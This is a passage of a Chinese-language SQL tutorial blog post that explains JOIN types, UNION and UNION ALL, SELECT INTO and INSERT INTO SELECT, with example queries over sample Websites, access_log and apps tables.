<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.id, Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/join1.jpg)</p>
<p>不同的 SQL JOIN</p>
<p>在我们继续讲解实例之前，我们先列出您可以使用的不同的 SQL JOIN 类型：</p>
<ul>
<li><strong>INNER JOIN</strong>：如果表中有至少一个匹配，则返回行</li>
<li><strong>LEFT JOIN</strong>：即使右表中没有匹配，也从左表返回所有的行</li>
<li><strong>RIGHT JOIN</strong>：即使左表中没有匹配，也从右表返回所有的行</li>
<li><strong>FULL JOIN</strong>：只要其中一个表中存在匹配，则返回行</li>
</ul>
<p>首先，连接的结果可以在逻辑上看作是由SELECT语句指定的列组成的新表。</p>
<p>左连接与右连接的左右指的是以两张表中的哪一张为基准，它们都是外连接。</p>
<p>外连接就好像是为非基准表添加了一行全为空值的万能行，用来与基准表中找不到匹配的行进行匹配。假设两个没有空值的表进行左连接，左表是基准表，左表的所有行都出现在结果中，右表则可能因为无法与基准表匹配而出现是空值的字段。</p>
<p>这部分主要涉及的是表连接的逻辑问题，</p>
<p>得到的结果数：</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inner <span class="built_in">join</span> &lt;= <span class="built_in">min</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br><span class="line">full <span class="built_in">join</span> &gt;= <span class="built_in">max</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br><span class="line">当 inner <span class="built_in">join</span> &lt; <span class="built_in">min</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>) 时， full <span class="built_in">join</span> &gt; <span class="built_in">max</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INNER-JOIN-关键字"><a href="#SQL-INNER-JOIN-关键字" class="headerlink" title="SQL INNER JOIN 关键字"></a>SQL INNER JOIN 关键字</h4><p>INNER JOIN 关键字在表中存在至少一个匹配时返回行。</p>
<p>SQL INNER JOIN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>INNER JOIN 与 JOIN 是相同的。</p>
<p>![SQL INNER JOIN](The First Day for Web/img_innerjoin.gif)</p>
<p>SQL INNER JOIN 实例</p>
<p>下面的 SQL 语句将返回所有网站的访问记录：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>INNER JOIN 关键字在表中存在至少一个匹配时返回行。如果 “Websites” 表中的行在 “access_log” 中没有匹配，则不会列出这些行。</p>
<h4 id="SQL-LEFT-JOIN-关键字"><a href="#SQL-LEFT-JOIN-关键字" class="headerlink" title="SQL LEFT JOIN 关键字"></a>SQL LEFT JOIN 关键字</h4><p>LEFT JOIN 关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p>
<p>SQL LEFT JOIN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>在某些数据库中，LEFT JOIN 称为 LEFT OUTER JOIN。</p>
<p>![SQL LEFT JOIN](The First Day for Web/img_leftjoin.gif)</p>
<p>SQL LEFT JOIN 实例</p>
<p>下面的 SQL 语句将返回所有网站及他们的访问量（如果有的话）。</p>
<p>以下实例中我们把 Websites 作为左表，access_log 作为右表：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/left-join1.jpg)</p>
<p><strong>注释：</strong>LEFT JOIN 关键字从左表（Websites）返回所有的行，即使右表（access_log）中没有匹配。</p>
<p>在使用 <strong>join</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p>
<ul>
<li>1、 <strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li>
<li>2、<strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li>
</ul>
<h4 id="SQL-RIGHT-JOIN-关键字"><a href="#SQL-RIGHT-JOIN-关键字" class="headerlink" title="SQL RIGHT JOIN 关键字"></a>SQL RIGHT JOIN 关键字</h4><p>几乎同 LEFT JOIN</p>
<h4 id="SQL-FULL-OUTER-JOIN-关键字"><a href="#SQL-FULL-OUTER-JOIN-关键字" class="headerlink" title="SQL FULL OUTER JOIN 关键字"></a>SQL FULL OUTER JOIN 关键字</h4><p>FULL OUTER JOIN 关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行.</p>
<p>FULL OUTER JOIN 关键字结合了 LEFT JOIN 和 RIGHT JOIN 的结果。</p>
<p>SQL FULL OUTER JOIN 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>![SQL FULL OUTER JOIN](The First Day for Web/img_fulljoin.gif)</p>
<p>SQL FULL OUTER JOIN 实例</p>
<p>下面的 SQL 语句选取所有网站访问记录。</p>
<p><strong>MySQL中不支持 FULL OUTER JOIN，你可以在 SQL Server 测试以下实例。</strong></p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line">FULL <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>FULL OUTER JOIN 关键字返回左表（Websites）和右表（access_log）中所有的行。如果 “Websites” 表中的行在 “access_log” 中没有匹配或者 “access_log” 表中的行在 “Websites” 表中没有匹配，也会列出这些行。</p>
<h4 id="SQL-UNION-操作符"><a href="#SQL-UNION-操作符" class="headerlink" title="SQL UNION 操作符"></a>SQL UNION 操作符</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>
<p>SQL UNION 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p>SQL UNION ALL 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><strong>注释：UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</strong></p>
<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT <span class="symbol">*</span> FROM Websites;</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “apps” APP 的数据：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM apps;</span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+-------------------------+</span>---------+</span><br><span class="line">| id | app<span class="emphasis">_name   | url                     | country |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">|  1 | QQ APP     | http://im.qq.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  2 | 微博 APP | http://weibo.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>SQL UNION 实例</p>
<p>下面的 SQL 语句从 “Websites” 和 “apps” 表中选取所有<strong>不同的</strong>country（只有不同的值）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/union1.jpg)</p>
<p><strong>注释：</strong>UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！</p>
<hr>
<p>SQL UNION ALL 实例</p>
<p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取<strong>所有的</strong>country（也有重复的值）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/union2.jpg)</p>
<hr>
<p>带有 WHERE 的 SQL UNION ALL</p>
<p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取<strong>所有的</strong>中国(CN)的数据（也有重复的值）：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country, <span class="keyword">name</span> <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country, app_name <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/AAA99C7B-36A5-43FB-B489-F8CE63B62C71.jpg)</p>
<p>使用UNION命令时需要注意，只能在最后使用一个ORDER BY命令，是将两个查询结果合在一起之后，再进行排序！绝对不能写两个ORDER BY命令。</p>
<p>另外，在使用ORDER BY排序时，注意两个结果的别名保持一致，使用别名排序很方便。当然也可以使用列数。</p>
<p>ORDER BY 除了可以对指定的字段进行排序，还可以使用函数进行排序:</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="title">by</span> abs(a);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-SELECT-INTO-语句"><a href="#SQL-SELECT-INTO-语句" class="headerlink" title="SQL SELECT INTO 语句"></a>SQL SELECT INTO 语句</h4><p>SELECT INTO 语句从一个表复制数据，然后把数据插入到另一个新表中。</p>
<p><strong>注意：</strong></p>
<p>MySQL 数据库不支持 SELECT … INTO 语句，但支持 INSERT INTO … SELECT 。</p>
<p>当然你可以使用以下语句来拷贝表结构及数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 新表</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 旧表</span><br></pre></td></tr></table></figure>

<p>SQL SELECT INTO 语法</p>
<p>我们可以复制所有的列插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="keyword">INTO</span> newtable [<span class="keyword">IN</span> externaldb]</span><br><span class="line"><span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p>或者只复制希望的列插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">INTO</span> newtable [<span class="keyword">IN</span> externaldb]</span><br><span class="line"><span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong>新表将会使用 SELECT 语句中定义的列名称和类型进行创建。您可以使用 AS 子句来应用新名称。</p>
<p>SQL SELECT INTO 实例</p>
<p>创建 Websites 的备份复件：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>只复制一些列插入到新表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">url</span></span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>只复制中国的网站插入到新表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>复制多个表中的数据插入到新表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">INTO</span> WebsitesBackup2016</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong>SELECT INTO 语句可用于通过另一种模式创建一个新的空表。只需要添加促使查询没有数据返回的 WHERE 子句即可：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">INTO</span> newtable</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span>=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INSERT-INTO-SELECT-语句"><a href="#SQL-INSERT-INTO-SELECT-语句" class="headerlink" title="SQL INSERT INTO SELECT 语句"></a>SQL INSERT INTO SELECT 语句</h4><p>INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。目标表中任何已存在的行都不会受影响。</p>
<p>SQL INSERT INTO SELECT 语法</p>
<p>我们可以从一个表中复制所有的列插入到另一个已存在的表中：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table2</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table1;</span><br></pre></td></tr></table></figure>

<p>或者我们可以只复制希望的列插入到另一个已存在的表中：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table2</span><br><span class="line">(<span class="name">column_name</span>(<span class="name">s</span>))</span><br><span class="line">SELECT column_name(<span class="name">s</span>)</span><br><span class="line">FROM table1<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “apps” APP 的数据：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM apps;</span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+-------------------------+</span>---------+</span><br><span class="line">| id | app<span class="emphasis">_name   | url                     | country |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">|  1 | QQ APP     | http://im.qq.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  2 | 微博 APP | http://weibo.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>SQL INSERT INTO SELECT 实例</p>
<p>复制 “apps” 中的数据插入到 “Websites” 中：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, country)</span><br><span class="line"><span class="keyword">SELECT</span> app_name, country <span class="keyword">FROM</span> apps;</span><br></pre></td></tr></table></figure>

<p>只复 QQ 的 APP 到 “Websites” 中：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, country)</span><br><span class="line"><span class="keyword">SELECT</span> app_name, country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>select into from 和 insert into select 都是用来复制表</p>
<p>两者的主要区别为： <strong>select  into … from</strong> 要求目标表不存在，因为在插入时会自动创建；<strong>insert into … select from</strong> 要求目标表存在。</p>
<p>\1. 复制表结构及其数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old</span><br></pre></td></tr></table></figure>

<p>\2. 只复制表结构：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old <span class="keyword">where</span> <span class="number">1</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">table</span> table_name_new <span class="comment">like table_name_old</span></span><br></pre></td></tr></table></figure>

<p>\3. 只复制表数据：</p>
<p>如果两个表结构一样：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_name_new <span class="keyword">select</span> * <span class="keyword">from</span> table_name_old</span><br></pre></td></tr></table></figure>

<p>如果两个表结构不一样：</p>
